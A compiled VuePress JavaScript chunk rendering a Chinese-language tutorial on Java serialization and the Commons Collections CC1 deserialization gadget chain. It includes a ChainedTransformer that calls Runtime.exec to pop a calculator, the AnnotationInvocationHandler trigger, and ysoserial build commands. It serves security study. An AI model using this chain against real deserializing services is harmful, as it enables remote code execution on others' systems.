(window.webpackJsonp=window.webpackJsonp||[]).push([[45],{346:function(e,a,r){"use strict";r.r(a);var n=r(22),t=Object(n.a)({},(function(){var e=this,a=e.$createElement,r=e._self._c||a;return r("ContentSlotsDistributor",{attrs:{"slot-key":e.$parent.slotKey}},[r("h2",{attrs:{id:"概念"}},[r("a",{staticClass:"header-anchor",attrs:{href:"#概念"}},[e._v("#")]),e._v(" 概念")]),e._v(" "),r("blockquote",[r("p",[e._v("序列化: 对象 => 字节序列")]),e._v(" "),r("p",[e._v("反序列化: 字节序列 => 对象")])]),e._v(" "),r("h2",{attrs:{id:"java序列化"}},[r("a",{staticClass:"header-anchor",attrs:{href:"#java序列化"}},[e._v("#")]),e._v(" Java序列化")]),e._v(" "),r("blockquote",[r("p",[e._v("Java规定:实现Serializable和Externalizable接口的类的对象才能被序列化。")]),e._v(" "),r("p",[e._v("fastjson是另外一套实现的序列化机制,有别于Java原生的序列化模式")])]),e._v(" "),r("h4",{attrs:{id:"例子"}},[r("a",{staticClass:"header-anchor",attrs:{href:"#例子"}},[e._v("#")]),e._v(" 例子")]),e._v(" "),r("p",[e._v("添加person类,实现Serializable接口")]),e._v(" "),r("div",{staticClass:"language- extra-class"},[r("pre",{pre:!0,attrs:{class:"language-text"}},[r("code",[e._v("package it.fastjson.test;\nimport java.io.Serializable;\npublic class person implements Serializable {\n    private static final long serialVersionUID = -5809782578272943999L;\n\n    private String name;\n    private int age;\n    private String sex;\n\n    public String getName() {\n        return name;\n    }\n\n    public void setName(String name) {\n        this.name = name;\n    }\n\n    public int getAge() {\n        return age;\n    }\n\n    public void setAge(int age) {\n        this.age = age;\n    }\n\n    public String getSex() {\n        return sex;\n    }\n\n    public void setSex(String sex) {\n        this.sex = sex;\n    }\n}\n")])])]),r("p",[e._v("序列化和反序列化:")]),e._v(" "),r("div",{staticClass:"language- extra-class"},[r("pre",{pre:!0,attrs:{class:"language-text"}},[r("code",[e._v('    /*\n    序列化 writeObject\n    */\n    person p = new person();\n    p.setAge(11);\n    p.setName("hello");\n    p.setSex("男");\n\n    File file = new File("person.ser");\n    OutputStream os = new FileOutputStream(file);\n    ObjectOutputStream objectOutputStream = new ObjectOutputStream(os);\n    objectOutputStream.writeObject(p);\n\n    /*\n    反序列化 readObject\n    */\n    FileInputStream fs = new FileInputStream("person.ser");\n    ObjectInputStream objectInputStream = new ObjectInputStream(fs);\n    Object o = objectInputStream.readObject();\n    System.out.println(o); //这里o就是person对象的实例, person{name=\'hello\', age=11, sex=\'男\'}\n')])])]),r("h2",{attrs:{id:"什么是apache-commons-collections"}},[r("a",{staticClass:"header-anchor",attrs:{href:"#什么是apache-commons-collections"}},[e._v("#")]),e._v(" 什么是Apache Commons Collections?")]),e._v(" "),r("div",{staticClass:"language- extra-class"},[r("pre",{pre:!0,attrs:{class:"language-text"}},[r("code",[e._v("Apache Commons Collections 是一个扩展了Java标准库里的Collection结构的第三方基础库。\n它包含有很多jar工具包,提供了很多强有力的数据结构类型并且实现了各种集合工具类。\n\n说到底:就是对list/queue/set等进一步的抽象封装,提供更强大的功能的第三方库\n")])])]),r("h2",{attrs:{id:"怎么执行命令"}},[r("a",{staticClass:"header-anchor",attrs:{href:"#怎么执行命令"}},[e._v("#")]),e._v(" 怎么执行命令?")]),e._v(" "),r("h3",{attrs:{id:"transformedmap"}},[r("a",{staticClass:"header-anchor",attrs:{href:"#transformedmap"}},[e._v("#")]),e._v(" TransformedMap")]),e._v(" "),r("p",[e._v("TransformedMap:该类可以在一个元素被添加/删除/或是被修改时(即key或value：集合中的数据存储形式即是一个索引对应一个值，就像身份证与人的关系那样)，会调用transform方法自动进行特定的修饰变换")]),e._v(" "),r("p",[r("strong",[e._v("换句话说，TransformedMap类中的数据发生改变时，可以自动对进行一些特殊的变换，比如在数据被修改时，把它改回来; 或者在数据改变时，进行一些我们提前设定好的操作[执行代码]。")])]),e._v(" "),r("div",{staticClass:"language- extra-class"},[r("pre",{pre:!0,attrs:{class:"language-text"}},[r("code",[e._v("public static Map decorate(Map map, Transformer keyTransformer, Transformer valueTransformer) {\n    return new TransformedMap(map, keyTransformer, valueTransformer);\n}\n\nMap outerMap = TransformedMap.decorate(innerMap, null, transformedChain);\n//通过TransformedMap.decorate可以获得TransformedMap对象\n    \n第一个参数为待转化的Map对象\n第二个参数为Map对象内的key要经过的转化方法[Transformer类格式的函数]（可为单个方法，也可为链，也可为空）\n第三个参数为Map对象内的value要经过的转化方法[Transformer类格式的函数]\n")])])]),r("h3",{attrs:{id:"transformer"}},[r("a",{staticClass:"header-anchor",attrs:{href:"#transformer"}},[e._v("#")]),e._v(" Transformer")]),e._v(" "),r("p",[r("strong",[e._v("知识点")])]),e._v(" "),r("p",[r("code",[e._v("ConstantTransformer 把一个对象转化为常量，并返回。")])]),e._v(" "),r("p",[r("code",[e._v("InvokerTransformer 通过反射，返回一个对象")])]),e._v(" "),r("p",[r("code",[e._v("ChainedTransformer:ChainedTransformer为链式的Transformer，会挨个执行我们定义Transformer")])]),e._v(" "),r("h6",{attrs:{id:"invokertransformer类中的invokertransformer代码"}},[r("a",{staticClass:"header-anchor",attrs:{href:"#invokertransformer类中的invokertransformer代码"}},[e._v("#")]),e._v(" InvokerTransformer类中的InvokerTransformer代码")]),e._v(" "),r("div",{staticClass:"language- extra-class"},[r("pre",{pre:!0,attrs:{class:"language-text"}},[r("code",[e._v('public class InvokerTransformer implements Transformer, Serializable {\n    /*\n        Input参数为要进行反射的对象，\n        iMethodName,iParamTypes为调用的方法名称以及该方法的参数类型\n        iArgs为对应方法的参数\n        在invokeTransformer这个类的构造函数中我们可以发现，这三个参数均为可控参数\n    */\n    public InvokerTransformer(String methodName, Class[] paramTypes, Object[] args) {\n        super();\n        iMethodName = methodName;\n        iParamTypes = paramTypes;\n        iArgs = args;\n    }\n\n    public Object transform(Object input) {\n        if (input == null) {\n            return null;\n        }\n        try {\n            Class cls = input.getClass(); //重点代码\n            Method method = cls.getMethod(iMethodName, iParamTypes);\n            return method.invoke(input, iArgs);\n\n        } catch (NoSuchMethodException ex) {\n            throw new FunctorException("InvokerTransformer: The method \'" + iMethodName + "\' on \'" + input.getClass() + "\' does not exist");\n        } catch (IllegalAccessException ex) {\n            throw new FunctorException("InvokerTransformer: The method \'" + iMethodName + "\' on \'" + input.getClass() + "\' cannot be accessed");\n        } catch (InvocationTargetException ex) {\n            throw new FunctorException("InvokerTransformer: The method \'" + iMethodName + "\' on \'" + input.getClass() + "\' threw an exception", ex);\n        }\n    }\n\n}\n')])])]),r("h6",{attrs:{id:"transformers方法生成"}},[r("a",{staticClass:"header-anchor",attrs:{href:"#transformers方法生成"}},[e._v("#")]),e._v(" transformers方法生成")]),e._v(" "),r("div",{staticClass:"language- extra-class"},[r("pre",{pre:!0,attrs:{class:"language-text"}},[r("code",[e._v('Transformer[] transformers = new Transformer[] {\n    new ConstantTransformer(Runtime.class),\n    new InvokerTransformer("getMethod",\n            new Class[] {String.class, Class[].class }, new Object[] {\n            "getRuntime", new Class[0] }),\n    new InvokerTransformer("invoke",\n            new Class[] {Object.class, Object[].class }, new Object[] {\n            null, new Object[0] }),\n    new InvokerTransformer("exec",\n            new Class[] {String.class }, new Object[] {"open /Applications/Calculator.app"})};\n\n//首先构造一个Map和一个能够执行代码的ChainedTransformer，以此生成一个TransformedMap\nTransformer transformedChain = new ChainedTransformer(transformers);\n//以上代码实现的就是 Runtime.getRuntime,exec("open /Applications/Calculator.app")\n')])])]),r("p",[r("strong",[e._v("反射调用getRuntime函数，再调用getRuntime的exec()函数，执行命令。依次调用关系为： Runtime --\x3e getRuntime --\x3e exec();因此，我们要提前构造 ChainedTransformer链，它会按照我们设定的顺序依次调用Runtime, getRuntime,exec函数，进而执行命令。正式开始时，我们先构造一个TransformeMap实例，然后想办法修改它其中的数据，使其自动调用tansform()方法进行特定的变换(即我们之前设定好的)")])]),e._v(" "),r("h3",{attrs:{id:"生成transformedmap-参数是map和chainedtransformer-对transformedmap进行修改操作就能自动触发chainedtransformer函数中的命令执行"}},[r("a",{staticClass:"header-anchor",attrs:{href:"#生成transformedmap-参数是map和chainedtransformer-对transformedmap进行修改操作就能自动触发chainedtransformer函数中的命令执行"}},[e._v("#")]),e._v(" "),r("strong",[e._v("生成TransformedMap,参数是map和ChainedTransformer,对TransformedMap进行修改操作就能自动触发ChainedTransformer函数中的命令执行")])]),e._v(" "),r("h3",{attrs:{id:"执行如下代码会弹出计算器"}},[r("a",{staticClass:"header-anchor",attrs:{href:"#执行如下代码会弹出计算器"}},[e._v("#")]),e._v(" 执行如下代码会弹出计算器")]),e._v(" "),r("p",[r("img",{attrs:{src:"/java/commons-collection/cc1.jpg",alt:""}})]),e._v(" "),r("h2",{attrs:{id:"如何在反序列化-readobject-的时候触发修改transformedmap"}},[r("a",{staticClass:"header-anchor",attrs:{href:"#如何在反序列化-readobject-的时候触发修改transformedmap"}},[e._v("#")]),e._v(" 如何在反序列化(readObject())的时候触发修改TransformedMap?")]),e._v(" "),r("h3",{attrs:{id:"回顾上一步的代码-需要在readobject时造成代码的执行-需要满足如下2个条件-1-是重写readobject方法-2-方法对map的键值操作进行修改"}},[r("a",{staticClass:"header-anchor",attrs:{href:"#回顾上一步的代码-需要在readobject时造成代码的执行-需要满足如下2个条件-1-是重写readobject方法-2-方法对map的键值操作进行修改"}},[e._v("#")]),e._v(" "),r("strong",[e._v("回顾上一步的代码:需要在readObject时造成代码的执行,需要满足如下2个条件,1 是重写readObject方法,2.方法对map的键值操作进行修改")])]),e._v(" "),r("h3",{attrs:{id:"sun-reflect-annotation-annotationinvocationhandler类"}},[r("a",{staticClass:"header-anchor",attrs:{href:"#sun-reflect-annotation-annotationinvocationhandler类"}},[e._v("#")]),e._v(" sun.reflect.annotation.AnnotationInvocationHandler类")]),e._v(" "),r("p",[r("img",{attrs:{src:"/java/commons-collection/cc1_AnnotationInvocationHandler.jpg",alt:""}})]),e._v(" "),r("h2",{attrs:{id:"思路总结"}},[r("a",{staticClass:"header-anchor",attrs:{href:"#思路总结"}},[e._v("#")]),e._v(" 思路总结")]),e._v(" "),r("h4",{attrs:{id:"调用链"}},[r("a",{staticClass:"header-anchor",attrs:{href:"#调用链"}},[e._v("#")]),e._v(" 调用链")]),e._v(" "),r("p",[r("img",{attrs:{src:"/java/commons-collection/cc1%E6%80%BB%E7%BB%93.jpg",alt:""}})]),e._v(" "),r("blockquote",[r("p",[e._v("只需要构造AnnotationInvocationHandler的实例并且序列化 -> c1")])]),e._v(" "),r("blockquote",[r("p",[e._v("readObject 反序列化 c1 就能触发代码执行")])]),e._v(" "),r("h2",{attrs:{id:"ysoserial"}},[r("a",{staticClass:"header-anchor",attrs:{href:"#ysoserial"}},[e._v("#")]),e._v(" ysoserial")]),e._v(" "),r("p",[r("code",[e._v("ysoserial是一个生成序列化payload数据的工具。")])]),e._v(" "),r("div",{staticClass:"language- extra-class"},[r("pre",{pre:!0,attrs:{class:"language-text"}},[r("code",[e._v("git　clone https://github.com/frohoff/ysoserial.git\ncd ysoserial\nmvn package -DskipTests\n")])])])])}),[],!1,null,null,null);a.default=t.exports}}]);